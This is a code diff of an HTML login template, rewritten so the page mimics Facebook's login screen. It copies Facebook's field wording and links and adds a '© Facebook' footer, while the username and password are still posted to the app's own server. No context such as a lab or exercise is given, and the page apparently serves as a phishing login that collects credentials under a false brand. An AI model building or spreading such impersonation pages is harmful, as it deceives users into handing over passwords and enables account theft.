@@ -1,11 +1,36 @@
 {% extends "base.html" %}
 {% block content %}
+
 <section class="auth">
-  <h2>Login</h2>
-  <form method="post">
-    <input name="username" placeholder="Username or Email/Phone" required><br>
-    <input name="password" type="password" placeholder="Password" required><br>
-    <button type="submit" class="btn">Login</button>
-  </form>
+  <div class="login-container">
+    <!-- Logo -->
+    <div class="logo">
+      <div class="logo-circle">S</div>
+    </div>
+
+    <!-- Login form -->
+    <form method="post" class="login-form">
+      <input name="username" type="text" placeholder="Mobile number or email address" required><br>
+      <input name="password" type="password" placeholder="Password" required><br>
+      <button type="submit" class="btn-login">Log in</button>
+    </form>
+
+    <!-- Extra links -->
+    <div class="links">
+      <a href="#">Forgotten password?</a>
+    </div>
+
+    <hr>
+
+    <div class="create-account">
+      <a href="#" class="btn-create">Create new account</a>
+    </div>
+
+    <!-- Footer -->
+    <div class="meta-footer">
+      <span>© Facebook</span>
+    </div>
+  </div>
 </section>
+
 {% endblock %}
